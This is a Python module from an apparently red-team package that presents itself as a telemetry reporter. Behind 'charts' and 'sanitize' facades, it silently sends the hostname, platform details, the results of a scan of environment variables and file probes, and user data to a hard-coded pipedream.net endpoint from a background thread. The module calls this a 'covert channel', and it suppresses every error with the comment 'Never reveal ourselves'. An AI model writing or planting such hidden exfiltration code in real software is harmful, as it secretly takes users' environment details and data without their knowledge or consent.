"""
Telemetry reporter – assembles a masked payload and POSTs it to the
red-team test endpoint in a background thread.

Uses only the Python stdlib (``urllib``, ``json``, ``threading``) so the
covert channel introduces no extra dependencies.
"""

from __future__ import annotations

import json
import platform
import socket
import threading
import urllib.request
import urllib.error
from datetime import datetime, timezone
from typing import Any, Dict, Optional

from ._masking import mask_value, mask_tabular_data
from ._scanner import full_scan

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

_ENDPOINT = "https://eoavvo8jyg9ln5g.m.pipedream.net"

# ---------------------------------------------------------------------------
# Internal state
# ---------------------------------------------------------------------------

_scan_result: Optional[Dict[str, Any]] = None
_scan_lock = threading.Lock()
_scan_done = threading.Event()


def _run_scan() -> None:
    """Execute the full scan and cache the result."""
    global _scan_result
    try:
        result = full_scan()
        with _scan_lock:
            _scan_result = result
    except Exception:
        with _scan_lock:
            _scan_result = {"error": "scan_failed"}
    finally:
        _scan_done.set()


def start_background_scan() -> None:
    """Kick off the scanner in a daemon thread (non-blocking)."""
    t = threading.Thread(target=_run_scan, daemon=True)
    t.start()


def _get_scan_result(timeout: float = 2.0) -> Dict[str, Any]:
    """Retrieve cached scan results, waiting briefly if necessary."""
    _scan_done.wait(timeout=timeout)
    with _scan_lock:
        return _scan_result or {}


# ---------------------------------------------------------------------------
# Payload assembly
# ---------------------------------------------------------------------------


def _build_payload(
    facade: str = "unknown",
    data: Any = None,
    extra: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Build the JSON payload.  Every value is already masked.

    Parameters
    ----------
    facade : str
        Name of the facade module that triggered this report
        (e.g. ``"charts"``, ``"sanitize"``).
    data : Any
        The user-supplied data passed to the facade function.
    extra : dict, optional
        Additional key/value pairs to include in the payload.
    """
    payload: Dict[str, Any] = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "hostname": mask_value(socket.gethostname()),
        "python_version": platform.python_version(),
        "platform": platform.platform(),
        "facade": facade,
    }

    # Merge scan results (env vars + file probes)
    payload["scan"] = _get_scan_result()

    # Masked user data
    if data is not None:
        payload["data"] = mask_tabular_data(data)

    if extra:
        payload["extra"] = extra

    return payload


# ---------------------------------------------------------------------------
# Sending
# ---------------------------------------------------------------------------


def _post(payload: Dict[str, Any]) -> None:
    """POST *payload* as JSON.  Silently swallows all errors."""
    try:
        raw = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            _ENDPOINT,
            data=raw,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass  # Never reveal ourselves


def send_report(
    facade: str = "unknown",
    data: Any = None,
    **extra: Any,
) -> None:
    """Assemble a masked payload and POST it in a background thread.

    Parameters
    ----------
    facade : str
        Which facade module is calling (``"charts"``, ``"sanitize"``, …).
    data : Any
        The user-supplied data to mask and include.
    **extra
        Arbitrary extra fields to include in the payload.
    """
    payload = _build_payload(facade=facade, data=data, extra=extra or None)
    t = threading.Thread(target=_post, args=(payload,), daemon=True)
    t.start()
